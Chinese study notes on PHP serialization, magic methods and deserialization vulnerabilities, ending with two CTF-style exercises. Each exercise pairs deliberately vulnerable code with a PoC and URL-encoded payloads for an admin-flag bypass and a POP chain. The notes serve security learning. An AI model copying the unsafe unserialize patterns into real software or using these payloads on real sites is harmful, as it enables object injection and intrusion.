## PHP序列化
**原因**：
- 持久化存储对象状态：对象是内存中的动态数据结构，程序运行结束后会被销毁。通过序列化，可以将对象的状态（属性值等）转换为**字符串形式**，从而保存到文件、数据库等持久化介质中。后续需要时，再通过反序列化将字符串恢复为原来的对象，恢复其状态。
- 跨场景传输对象：在不同的执行场景（如进程间通信、网络传输、不同脚本间共享数据）中，内存中的对象无法直接传递。序列化后，对象被转换为标准化的字符串，可通过网络或文件等方式传输，接收方再反序列化为可用的对象。例如：在分布式系统中传递对象、通过 HTTP 会话（Session）共享对象。
- 简化数据处理：对于复杂对象（包含多个属性、嵌套结构），序列化可以将其 “扁平化” 为单一字符串，便于存储和处理，无需手动拼接或解析属性。
## 反序列化
**成功条件**：**类必须已定义且可访问**，  
反序列化时，PHP 需要找到对应的类定义（包括类名、属性、方法等）。如果类未定义，或定义在当前作用域不可访问（如未引入类文件、权限限制），反序列化会失败（通常返回`__PHP_Incomplete_Class`对象）。
例如：序列化了`User`类的对象，反序列化时必须先通过`require`/`include`加载`User`类的定义文件。
**序列化字符串格式合法**  
序列化后的字符串有严格的格式规范（如`O:4:"User":2:{s:4:"name";s:5:"Alice";s:3:"age";i:20;}`），如果字符串被篡改（如手动修改、传输损坏），会导致格式错误，反序列化失败并抛出异常。
**类的结构兼容**  
反序列化时，类的结构（属性名、类型等）需与序列化时兼容：
- 新增属性：反序列化后新增属性会使用默认值，不影响成功。
- 删除属性：序列化字符串中存在的属性在类中已删除，反序列化时会忽略该属性，不影响成功（但可能丢失数据）。
- 属性类型不兼容：例如序列化时是字符串属性，反序列化时类中该属性改为整数，可能导致数据类型错误，但反序列化本身仍可能成功（取决于数据是否可转换）。  
**无自定义反序列化逻辑阻碍**  
如果类中定义了`__wakeup()`方法（反序列化时自动调用），若该方法内部抛出异常或存在逻辑错误，会导致反序列化失败。
**触发前提**：魔术方法所在的类或对象被调用
## 魔术方法
在 PHP 中，魔术方法（Magic Methods）是一类特殊的预定义方法，它们以双下划线 `__` 开头（如 `__construct`、`__destruct`），当对象在特定场景下被操作时，会自动触发这些方法，无需手动调用。
### php魔术方法
1. ==`__construct()`:==
>`__construct()`用于在创建对象时自动触发
>当使用 new 关键字实例化(一个类时，会自动调用该类的  `__construct()` 方法
```php
<?php
class MyClass {
    public function __construct() {
        echo "已触发 __construct 一次";
    }
}
 
$obj = new MyClass();  // 创建对象时会输出 "已触发 __construct 一次"
?>
```
2. ==`__destruct()`:==
>`__destruct()` 用于在对象被销毁时自动触发
>对象的销毁对象的引用计数减少为零来触发
```php
<?php
class MyClass {
    public function __destruct() {
        echo "已触发 __destruct 一次\n";
    }
}
$obj=new MyClass();//会触发 __destruct
$test = serialize($obj); 
$rest1= unserialize($test);//会触发 __destruct
?>//最终触发两次
```
3. ==`__sleep():`==
>序列化serialize() 函数会检查类中是否存在一个魔术方法sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。
>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
>如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误
```php
<?php
class test
{
    public $var_1;
    public $var_2;
   
    public function __sleep()   //在对象被序列化时触发
    {
        echo "已触发 __sleep() 一次\n";
        return ['var_1','var_2'];
    }
}
 
$a = new test();
$a -> var_1 = 'var1';
$a -> var_2 = 'var2';
$b = serialize($a);     //会触发 __sleep
var_dump($b);
?>
```
4. ==`__wakeup():`==
>`__weekup()` 用于在反序列化对象时自动调用
>unserialize() 会检查是否存在一个 wakeup() 方法，
>如果存在，则会先调用wakeup()方法，预先准备对象需要的资源，返回void
>常用于反序列化操作中重新建立数据库连接或执行其他初始化操作
>PHP 反序列化中存在一个特性：当序列化字符串中表示对象属性数量的值**大于实际属性数量**时，`__wakeup()`方法会被跳过（不执行）。这是突破的关键。
```php
<?php
class test
{
    public $var_1;
    public $var_2;
    public $var_wakeup;
   
    public function __wakeup()   //在对象被反序列化时触发
    {
        echo "已触发 __wakeup 一次\n";
        $this -> var_wakeup = $this -> var_1;
    }
}
 
$a = new test();
$a -> var_1 = 'var1';
$a -> var_2 = 'var2';
$b = serialize($a);
$c = unserialize($b);   //会触发 __wakeup
var_dump($c);
?>
```
5. ==`__tostring():`==
>`__tostring()` 在对象被当做字符串处理时自动调用
>比如`echo`、`==`、`preg_match()`
```php
<?php
class test
{
    public $var_1;
    public function __tostring()   //对象被当做字符串处理时触发
    {
        echo "已触发 __tostring 一次\n";
        return '1';
    }
}
 
$a = new test;
$a == '123'; //会触发__tostring()
echo $a; //会触发__tostring()
?>//最后触发两次
```
6. ==`__invoke():`==
>`__invoke()` 在对象被当做函数处理时自动调用
```php
<?php
class test
{
    public $var_1='1';
    public function __invoke()   //对象被当做函数处理时触发
    {
        echo "已触发 __invock 一次\n";
    }
}
 
$a = new test('1');
$a(); //以函数的形式处理 $a 从而触发__invoke
?>
```
7. ==`__call():`==
>`__call($method, $args)` 在调用一个不存在的方法时触发, $args是数组的形式
```php
<?php
class test
{
    public function __call($method, $args)   //当调用一个不存在的方法时触发
    {
        echo "已触发 __call 一次\n";
    }
}
 
$a = new test;
$a -> nothingness('');    //因为nothingness()方法不存在，所以触发了 __call
?>
```
8. ==`__callStatic():`==
>`__callStatic()`在静态调用或调用成员常量时使用的方法不存在时触发
>该方法必须声明为`static`（静态），否则会报错
```php
<?php
class test
{
 
    static public function __callStatic($method, $args)
    {
        echo "已触发 __callStatic 一次\n"; 
    }
}
 
$a = new test(1);
$a::nothingness('a');
?>
```
`->`用于访问**对象的非静态属性或非静态方法**（即属于某个具体实例化对象的成员）
`对象变量->成员名`（成员可以是属性或方法）。
`::`用于访问**类的静态成员（静态属性、静态方法）** 或**父类的成员**，不需要实例化对象即可使用（也可通过对象访问静态成员）。
`类名::静态成员` 或 `对象变量::静态成员`
9. ==`__set():`==
>`__set()` 在给不存在的成员属性或 “不可访问的属性”(如私有属性)赋值时触发
```php
<?php
class test
{
    public $var_1;
    public $temp;
    public function __construct($var)   //在对象被创建时触发
    {
        echo "已触发 __construct 一次\n";
        $this -> var_1 = $var;
        $this -> var_nothingness = '114514';
    }
 
    public function __set($name, $value)    //在给不存在的成员属性赋值时触发
    {
        echo "已触发 __set 一次\n";
    }
}
 
$a = new test(1);
?>
```
10. ==`__isset():`==
>`__isset()` 在对不可访问属性使用 isset() 或empty() 或者属性不存在时会被触发
```php
<?php
class funny{
    private $var;
    public function __isset($arg1){
        echo 'hello world!';
    }
    }
$test=new funny();
isset($test->$var1);
?>
```
由于 `funny` 类的 `var` 属性是私有的（`private`），在类外部访问时会被视为不存在，因此会触发 `funny` 类的 `__isset` 魔术方法，输出 "hello world!"。我访问的`var1`属性不存在，也会触发isset
11. ==`__unset():`==
>`__unset()` 在对不可访问属性使用 unset() 时会被触发
```php
<?php
class funny{
    private $var;
    public function __unset($arg1){
        echo '$arg1';
    }
    }
$test=new funny();
unset($test->var);
?>
```
`var`是私有属性，不可访问，会触发`unset`,回显`var`
12. ==`__clone():`==
>`__clone()` 当使用 clone 关键字拷贝完成一个对象后就会触发
```php
<?php
class funny{
    private $var;
    public function __clone(){
        echo 'hello world!';
    }
    }
$test=new funny();
$newclass=clone($test);
?>
```
用`$newclass=clone($test);`进行复制，触发`__clone`
13. ==`__get():`==
>`__get()` 当尝试访问不可访问属性时会被自动调用
```php
<?php
class Test
{
    private $data = array();
 
    public function __construct($var)
    {
        echo "已触发 __construct 一次\n";
        $this->var_1 = $var;
    }
 
    public function __get($name)
    {
        echo "已触发 __get 一次\n";
        if (isset($this->data[$name])) {
            return $this->data[$name];
        }
    }
 
    public function __set($name, $value)
    {
        echo "已触发 __set 一次\n";
        $this->data[$name] = $value;
    }
}
 
$a = new Test(1);
$a->v = 'a';  // 设置属性
echo $a->v;   // 访问属性
var_dump($a);
?>
```
## PHP面向对象
PHP 面向对象编程（Object-Oriented Programming，简称 OOP）是一种以 “对象” 为核心的编程思想，通过封装、继承、多态等特性，实现代码的复用、扩展和维护。
## 面向过程和面向对象的区别
1. **核心思想不同**：
	- **面向过程**：以 “**过程**”（即步骤、函数）为核心，强调 “**怎么做**”。思路是将问题拆解为一系列步骤，通过函数实现每个步骤，然后按顺序调用这些函数完成任务。
	- **面向对象**：以 “**对象**”（即实体、事物）为核心，强调 “**用什么做**”。思路是将问题中的实体抽象为 “对象”，每个对象包含自身的属性（特征）和方法（行为），通过对象之间的交互完成任务。
2. **代码组织方式不同**：
	- **面向过程**：代码以**函数**为基本单位，数据（变量）和函数是分离的。例如：计算两个数的和，函数与数据独立：
		```php
		<?php
		$a=10;
		$b=20;
		function sum($x,$y){
			return $x+$y;
		}
		echo sum($a,$b)
		
		```
	- **面向对象**：代码以**类和对象**为基本单位，数据（属性）和函数（方法）被封装在类中，形成一个整体。例如：用 “计算器” 对象处理求和：
		```php
		<?php
		class Calculator{//数据和方法封装在类中
			private $a;
			private $b;
			public function __construct($x,$y){//构造方法初始化数据
				$this-> a = $x;
				$this-> b = $y;
			}
			public function sum(){//方法处理数据
				return $this->a+$this->b;
			}
			
		}
		$calc = new Calculator(10,20)；
		echo $calc->sum();//调用对象方法处理自身数据
		```
1. **核心特性不同**：
	- **面向过程**：无封装、继承、多态等特性，依赖函数参数传递数据，代码复用主要通过 “函数调用” 实现。
	- **面向对象**：依赖三大核心特性：
		- **封装**：将数据和方法捆绑，通过访问控制（public/private/protected）限制外部直接操作内部数据，提高安全性。
		- **继承**：子类可继承父类的属性和方法，减少重复代码，实现 “代码复用”。
		- **多态**：不同对象对同一方法可有不同实现，提高代码灵活性和扩展性。
2. **适用场景不同**：
	- **面向过程**：适合**简单、线性**的任务，逻辑单一，不需要复杂扩展。若需求变更，需修改多个相关函数，维护成本高。
	- **面向对象**：适合**复杂、规模大**的项目，需要长期维护和扩展。通过 “继承” 和 “多态” 实现复用，修改时只需调整类内部逻辑，不影响其他关联代码，维护成本低。
## 类
在 PHP 中，**类（Class）是对一类事物的抽象描述**，它定义了这类事物共同的**属性**（特征）和**方法**（行为）
**核心组成**：
- **属性**：类中定义的变量，用于描述事物的特征，访问修饰符有三种
	- **public**：公开的，类内外均可访问。
	- **private**：私有的，仅类内部可访问。
	- **protected**：受保护的，类内部和子类可访问。
- **方法**：类中定义的函数，用于描述事物的行为
## **类与对象的关系**
类是抽象的 “模板”，**对象是类的具体实例**。通过 `new` 关键字可以从类创建对象，然后通过对象使用类中定义的属性和方法。
```php
// 从 Person 类创建对象（实例化）
$person1 = new Person();

// 操作对象的属性和方法
$person1->name = "张三";    // 给公开属性赋值
$person1->setAge(25);      // 调用方法设置私有属性
$person1->sayHello();      // 调用方法，输出：大家好，我叫张三
echo $person1->getAge();   // 调用方法获取年龄，输出：25
```
## 反序列化漏洞的成因
反序列化漏洞（Unserialization Vulnerability）主要源于程序对不可信数据进行反序列化操作时，未对数据进行严格验证，导致攻击者可通过构造恶意序列化数据，触发对象中的敏感操作（如魔术方法、类方法），进而执行恶意代码或控制程序流程。例如：反序列化（如 PHP 的 `unserialize()`）不仅会恢复对象的属性，还会自动触发类中的魔术方法（如 `__wakeup()`、`__destruct()`、`__call()` 等）。这些方法若包含危险操作（如执行命令、文件操作、数据库查询等），攻击者可通过篡改序列化数据中的属性值，诱导魔术方法执行恶意逻辑。
漏洞的根本原因是程序接收**用户可控的序列化数据**（如通过 URL 参数、表单、Cookie 等传入），且未经过滤或验证就直接传入反序列化函数（如 `unserialize()`）
序列化数据（如 PHP 的序列化字符串）是明文可解析的格式，攻击者可通过分析格式规则，手动构造或修改属性值，指向恶意目标。
## POP链
都是从程序现有代码中筛选可调用的 “代码片段”，串联成攻击链以达成恶意目的。普通反序列化漏洞利用常依赖魔术方法（如`__wakeup ()`、`__destruct` () 等）触发恶意代码，但当关键恶意代码藏在普通类方法中时，就需要 POP 链搭建魔术方法和普通类方法的调用桥梁。通过构造包含多个关联对象的链条，让反序列化操作执行时，顺着链条逐层调用函数，最终触发敏感操作，比如执行恶意代码、读取敏感文件等。private无法从外部访问，可以在构造poc时改为public
## 例题一
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class User {
public $name;
public $isAdmin = false;
function __construct($name) {//5.这个可以new User 触发
$this->name = $name;
}
function __toString() {//4.这里可以修改name为自己想要的
return "User: " . $this->name;
}
function __wakeup() {
if ($this->isAdmin === true) {//2.这里可以手动改isadmin=true
echo "Congratulations! You have successfully exploited unserialize!";//3.echo 触发__tostring
}
}
}
if (isset($_COOKIE['data'])) {
$data = unserialize($_COOKIE['data']);//1.首先反序列化触发__wakeup
echo $data;
} else {
$user = new User("guest");
setcookie("data", serialize($user));
echo "Hello guest, please refresh!";
}
```
构造poc
```php
<?php 
class User {
public $name="nix";
public $isAdmin = true;
}
$obj = new User();
echo urlencode(serialize($obj));
?>
```
得到payload`O%3A4%3A%22User%22%3A2%3A%7Bs%3A4%3A%22name%22%3Bs%3A3%3A%22nix%22%3Bs%3A7%3A%22isAdmin%22%3Bb%3A1%3B%7D` url编码是避免特殊字符影响 cookie 传输
## 例题二
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$D0g3 = $_POST['D0g3'];
class A {
private $a1;
private $a2;
public function __wakeup() {
echo $this->a1;//6.触发__tostring,但要触发__wakeup
}
public function __unset($arg1) {//3.访问不可访问属性，触发__get,但要触发__unset
echo $this->a2->$a2;
}
}
class B {
private $b1;
private $b2;
public function __toString() {
$b3 = $this->b1;
return $b3();//5，当成函数调用，触发__invoke,但要触发__tostring
}
public function __get($arg1) {
$this->b2->flag();//2,要触发flag()就要触发__get
}
}
class C {
private $c1;
public function __invoke() {
unset($this->c1->c1);//4.触发__unset,但要触发__invoke,
}
public function flag() {
echo "you are pop chain high hand!";//1.目标触发，要触发flag()
}
}
unserialize($D0g3);//7.触发__wakeup
```
构造poc
```php
<?php
class A {
public $a1;
public $a2;
}
class B {
public $b1;
public $b2;
}
class C {
public $c1;
}
$a = new A();
$b = new B();
$c = new C();
$a->a1=$b;
$a->a2=$b;
$b->b1=$c;
$b->b2=$c;
$c->c1=$a; 
echo urlencode(serialize($a));
```
得到payload`O%3A1%3A%22A%22%3A2%3A%7Bs%3A2%3A%22a1%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Br%3A1%3B%7Ds%3A2%3A%22b2%22%3Br%3A3%3B%7Ds%3A2%3A%22a2%22%3Br%3A2%3B%7D`






